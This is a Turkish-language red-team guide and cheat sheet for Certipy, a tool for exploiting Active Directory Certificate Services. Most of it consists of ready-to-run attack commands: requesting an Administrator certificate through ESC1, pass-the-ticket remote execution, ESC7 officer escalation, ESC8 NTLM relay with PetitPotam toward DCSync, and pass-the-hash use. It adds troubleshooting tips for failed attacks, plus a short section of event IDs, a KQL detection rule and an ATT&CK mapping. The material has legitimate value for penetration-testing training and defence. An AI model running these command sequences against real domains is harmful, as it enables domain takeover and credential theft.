## 1. Genel Bakış ve Modüler Mimari

Active Directory Certificate Services (AD CS) saldırı yüzeyinin genişliği (ESC1'den ESC16'ya kadar uzanan şablon zaafları, CA konfigürasyon hataları, makine eşleme açıkları ve HTTP NTLM relay vektörleri); çok sayıda farklı aracın (PowerView, Certify, Rubeus, Impacket, openssl) bir arada kullanılmasını zorunlu kılıyordu.

Oliver Lyak tarafından geliştirilen **Certipy**, AD CS sömürü yaşam döngüsünün tüm aşamalarını tek bir Python çatısı altında toplayan operasyonel bir standarttır:
- **Keşif (Enumeration):** Etki alanındaki tüm CA'ları, şablonları, izinleri ve zafiyetleri tarar (`find`), BloodHound ile içe aktarılabilir JSON grafikleri üretir.
- **Sertifika İşlemleri (Enrollment):** RPC ve HTTP üzerinden sertifika talep eder (`req`), PFX sertifikalarını KDC ile PKINIT doğrulamasına sokarak TGT ve NT hash elde eder (`auth`).
- **Yetki Gaspı ve Manipülasyon:** CA izinlerini (`ca`), şablon DACL'lerini (`template`), makine hesaplarını (`account`) ve gölge kimlikleri (`shadow`) tek komutla yönetir.
- **Relay ve Kalıcılık:** Web Enrollment NTLM relay dinleyicisi (`relay`) ve CA özel anahtarıyla çevrimdışı sertifika sahteciliği (`forge`) sağlar.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    CERTIPY MODÜLER KOMUT MİMARİSİ                           │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
          ┌───────────────────────────┼───────────────────────────┐
          ▼                           ▼                           ▼
    [1. Keşif & Analiz]        [2. Sömürü & Bilet]         [3. CA & Nesne Yönetimi]
    - certipy find             - certipy req               - certipy ca (ESC7/ESC6)
      (-vulnerable,            - certipy auth              - certipy template (ESC4)
       -bloodhound)              (PKINIT + UnPAC)          - certipy account (Certifried)
                               - certipy relay (ESC8)      - certipy shadow (05.4)
                                                           - certipy forge (Golden Cert)
```

### 1.1 Certipy Alt Komut Fonksiyon Tablosu

| Alt Komut | İlgili Protokol / Taşıyıcı | Operasyonel Kullanım Amacı |
|---|---|---|
| **find** | LDAP (389/636) | CA'ları, şablonları, erişim izinlerini ve ESC1-ESC16 zafiyetlerini listeler. |
| **req** | MS-WCCE / RPC (135) | Belirtilen şablondan sahte SAN/UPN ile `.pfx` sertifikası talep eder. |
| **auth** | Kerberos PKINIT (88) | PFX sertifikasını KDC'ye sunarak Kerberos TGT'si alır ve NT hash'i çözer. |
| **template** | LDAP (DACL / Write) | Şablon izinlerini modifiye eder; şablonu geçici olarak ESC1 yapar ve geri yükler. |
| **ca** | MS-CSRA / RPC | CA üzerinde Certificate Officer ekler, talepleri onaylar ve ESC6 bayrağını açar. |
| **account** | LDAP / SAMR | Certifried için makine hesabı oluşturur, `dNSHostName` alanını günceller. |
| **shadow** | LDAP / PKINIT | `msDS-KeyCredentialLink` anahtarı enjekte eder ve UnPAC-the-Hash uygular. |
| **relay** | HTTP (80/443) | Web Enrollment arayüzüne yönelik NTLM relay dinleyicisi başlatır. |
| **forge** | Çevrimdışı Kriptografi | Çalınan CA özel anahtarı ile istenen kullanıcı adına Golden Certificate üretir. |

## 2. Derinlemesine Teknik Mekanizmalar

### 2.1 Kimlik Doğrulama Esnekliği (Parola, Hash ve Bilet Desteği)
Certipy, yalnızca açık metin parolayla değil; kırmızı takım operasyonlarında ele geçirilen her türlü kimlik biçimiyle çalışabilir:
- **NTLM Hash ile:** `-hashes :aad3b435b51404eeaad3b435b51404ee:28f98e0c5e63078b8474ba0c4d5d7476`
- **Kerberos Bileti ile:** Ortam değişkenine tanımlı `.ccache` dosyası üzerinden `-k -no-pass`
- **PFX Sertifikası ile:** `-pfx admin.pfx`
- **Şifreli Tünelleme:** Tüm alt komutlarda `-scheme ldaps` veya `-dc-ip` ile LDAPS/TLS zorlaması.

### 2.2 BloodHound Entegrasyonu (`-bloodhound`)
`certipy find -bloodhound` çalıştırıldığında etki alanındaki AD CS altyapısını analiz ederek bir ZIP arşivi üretir. Bu dosya BloodHound CE arayüzüne yüklendiğinde:
- `EnterpriseCA`, `CertTemplate`, `RootCA` düğümleri oluşturulur.
- `CanEnroll`, `EnrollOnBehalfOf`, `ManageCA`, `ManageCertificates`, `WriteOwner` kenarları çizilir.
- "Shortest Paths from Domain Users to High Value Targets via AD CS" graf sorgularını doğrudan besler.

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: Zafiyet Keşfi ve BloodHound Veri Çıkarımı
```bash
# 1. Zafiyetli şablonları ekrana dökümleme
certipy find -u jdoe@corp.local -p 'Welcome123!' -dc-ip 10.10.10.5 -vulnerable -stdout

# 2. BloodHound için grafik verisi üretme (ZIP arşivi oluşturur)
certipy find -u jdoe@corp.local -p 'Welcome123!' -dc-ip 10.10.10.5 -bloodhound
```

### Senaryo 2: ESC1 Sömürüsü ve Kerberos Bilet Enjeksiyonu
```bash
# 1. Administrator SAN'ı ile sertifika talep et
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' \
  -template 'UserAuthentication' -upn Administrator@corp.local -dc-ip 10.10.10.5

# 2. Üretilen administrator.pfx ile TGT al ve .ccache dosyasına kaydet
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5

# 3. Bileti oturuma yükleyip uzaktan kod yürüt
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@10.10.10.5
```

### Senaryo 3: ESC7 ile CA'yı Silahlandırma (Officer Ekleme ve İstek Onaylama)
```bash
# 1. CA üzerinde ManageCA hakkı varsa jdoe'yu Certificate Officer yap
certipy ca -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' -add-officer jdoe -dc-ip 10.10.10.5

# 2. Yönetici onayı bekleyen bir şablondan talep gönder (Talep ID'si döner)
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' -template 'ApprovalsRequired' -upn Administrator@corp.local -dc-ip 10.10.10.5

# 3. Yeni kazanılan Officer yetkisiyle bekleyen talebi onayla
certipy ca -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' -issue-request <REQUEST_ID> -dc-ip 10.10.10.5

# 4. Onaylanan sertifikayı CA'dan indir
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' -retrieve <REQUEST_ID> -dc-ip 10.10.10.5
```

### Senaryo 4: ESC8 HTTP Web Enrollment NTLM Relay
```bash
# 1. Certipy dinleyicisini başlat ve DomainController şablonunu hedefle
certipy relay -target 'http://ca01.corp.local/certsrv/certfnsh.asp' -template 'DomainController'

# 2. PetitPotam ile Domain Controller makinesini dinleyiciye yönlendir
petitpotam.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5

# 3. Relay tamamlandığında teslim edilen DC01$.pfx ile DCSync yap
certipy auth -pfx dc01$.pfx -dc-ip 10.10.10.5
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `Got error while trying to request certificate: CERTSRV_E_TEMPLATE_DENIED` | Talep edilen şablon hedef CA sunucusunda yayınlanmamış (not published). | `certipy find` çıktısında CA'nın `Enabled Templates` listesini kontrol edin; yayınlanmış bir şablon seçin. |
| `KDC_ERR_CLIENT_NOT_TRUSTED on auth` | Sertifikayı imzalayan CA kök sertifikası DC'nin `NTAuthCertificates` deposunda kayıtlı değil. | Şirket içi yetkili kurumsal CA adını belirttiğinizden emin olun (`-ca CORP-CA`). |
| `CERTSRV_E_BAD_REQUESTPARAMETER (SAN disallowed)` | Şablonda veya CA'da `ENROLLEE_SUPPLIES_SUBJECT` kapalı; CA harici SAN parametresini reddediyor. | ESC1 zafiyetine sahip başka bir şablon bulun veya ESC4/ESC6 vektörlerini değerlendirin. |
| `Request ID is pending (CERTSRV_E_ENROLL_DENIED)` | Şablon yönetici onayı (`Manager Approval`) gerektiriyor. | ESC7 yetkiniz varsa `certipy ca -issue-request` ile onaylayın veya onay gerektirmeyen şablon arayın. |
| `Got error: StrongCertificateBindingEnforcement` | DC üzerinde KB5014754 zorlama modu açık; sertifikada nesne SID uzantısı bulunmuyor. | Talebe `-sid <TARGET_USER_SID>` parametresini ekleyerek güçlü eşleme uyumlu talep gönderin. |
| `Failed to connect to LDAP / RPC port unreachable` | Güvenlik duvarı LDAP (389/636) veya dinamik RPC (Port 135) portlarını engelliyor. | Hedef IP'yi doğrulayın; gerekiyorsa `-scheme ldaps` veya `-rpc` alternatif bayraklarını deneyin. |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 4886 / 4887 (Sertifika Talebi ve Dağıtımı):** Talep eden hesap (`Requester`) ile sertifikanın SAN alanındaki hesap arasındaki uyumsuzluk doğrudan izlenir.
- **Event ID 4898 (Sertifika Şablonu Güncellendi):** ESC4 sömürüsünde `certipy template` komutu şablon özelliklerini değiştirdiğinde tetiklenir.
- **Event ID 4768 (PKINIT Kerberos TGT Talebi):** `Pre-Authentication Type: 16` (PKINIT) ve sertifika parmak izi denetlenir.
- **Event ID 5136 (Dizin Nesnesi Değiştirildi):** Şablon veya CA konteynerinde gerçekleşen DACL modifikasyonları.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: Kısa Sürede Tüm Şablonların LDAP Üzerinden Taranması (Certipy Find Tespiti)
SecurityEvent
| where EventID == 4662 and ObjectServer =~ "DS"
| where ObjectType contains "pKICertificateTemplate"
| summarize QueryCount = count() by SubjectUserName, bin(TimeGenerated, 2m)
| where QueryCount > 15
| project TimeGenerated, SubjectUserName, QueryCount
```

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Operasyonel Kullanım Aşaması |
|---|---|---|
| **T1649** | Steal or Forge Authentication Certificates | Certipy ile sertifika talep etme ve PKINIT. |
| **T1087.002** | Account Discovery: Domain Account | `certipy find` ile dizin ve sertifika şablon analizi. |
| **T1098** | Account Manipulation | `certipy ca -add-officer` ve `certipy template` değişiklikleri. |
| **T1187** | Forced Authentication | `certipy relay` ile NTLM oturumunun CA'ya yönlendirilmesi. |

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: Certipy ile Zafiyetli Şablonları Tarama
```bash
certipy find -u jdoe@corp.local -p 'Welcome123!' -dc-ip 10.10.10.5 -vulnerable -stdout
```
- **Ne Yapar?** Etki alanındaki tüm AD CS şablonlarını tarar ve yalnızca sömürülebilir olanları ekrana listeler.
- **Ne Zaman Kullanılır?** İlk erişim sonrası AD CS saldırı vektörlerini hızla tespit etmek için.
- **Parametreler:** `-vulnerable`: Zafiyetsiz şablonları filtreler; `-stdout`: Çıktıyı doğrudan konsola basar.

### Komut 2: Certipy ile ESC1 Sertifikası İsteme
```bash
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' -template 'UserAuth' -upn Administrator@corp.local -dc-ip 10.10.10.5
```
- **Ne Yapar?** ESC1 şablonunu kullanarak Administrator kimliğinde `.pfx` formatında özel anahtarlı sertifika alır.
- **Ne Zaman Kullanılır?** Şablonda `ENROLLEE_SUPPLIES_SUBJECT` ve Client Authentication EKU'su tespit edildiğinde.
- **Parametreler:** `-ca`: CA adı; `-template`: Şablon adı; `-upn`: Taklit edilecek kullanıcı.

### Komut 3: PFX ile PKINIT Kimlik Doğrulaması ve Hash Alma
```bash
certipy auth -pfx Administrator.pfx -dc-ip 10.10.10.5
```
- **Ne Yapar?** İndirilen sertifikayı KDC'ye sunarak Kerberos TGT'si (`.ccache`) alır ve UnPAC-the-Hash ile NT hash'ini döker.
- **Ne Zaman Kullanılır?** Sertifika elde edildikten hemen sonra bilet ve açık parola karmasını almak için.
- **Parametreler:** `-pfx`: Sertifika dosyası; `-dc-ip`: Domain Controller adresi.

### Komut 4: NTHash ile Parolasız Certipy Çalıştırma
```bash
certipy find -u jdoe@corp.local -hashes :28f98e0c5e63078b8474ba0c4d5d7476 -dc-ip 10.10.10.5 -vulnerable
```
- **Ne Yapar?** Açık parola bilmeksizin NT hash kullanarak AD CS denetimi ve sömürüsü gerçekleştirir.
- **Ne Zaman Kullanılır?** Pass-the-Hash senaryolarında parolasız çalışırken.
- **Parametreler:** `-hashes`: Kullanıcıya ait NT hash değeri.

### Komut 5: ESC7 ile Certificate Officer Ekleme
```bash
certipy ca -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' -add-officer jdoe -dc-ip 10.10.10.5
```
- **Ne Yapar?** CA üzerindeki `ManageCA` hakkını kullanarak saldırgan hesabını sertifika yöneticisi (Officer) yapar.
- **Ne Zaman Kullanılır?** Bekleyen sertifika taleplerini onaylama yetkisi kazanmak için.
- **Parametreler:** `-add-officer`: Eklenecek kullanıcı adı.

### Komut 6: Certipy HTTP Web Enrollment Relay Dinleyicisi
```bash
certipy relay -target 'http://ca01.corp.local/certsrv/certfnsh.asp' -template 'DomainController'
```
- **Ne Yapar?** ESC8 zafiyeti için NTLM relay dinleyicisi başlatır ve gelen makine bağlantılarına sertifika üretir.
- **Ne Zaman Kullanılır?** PetitPotam ile DC'yi CA web servisine yönlendirirken.
- **Parametreler:** `-target`: Web enrollment URL'i; `-template`: Talep edilecek şablon.
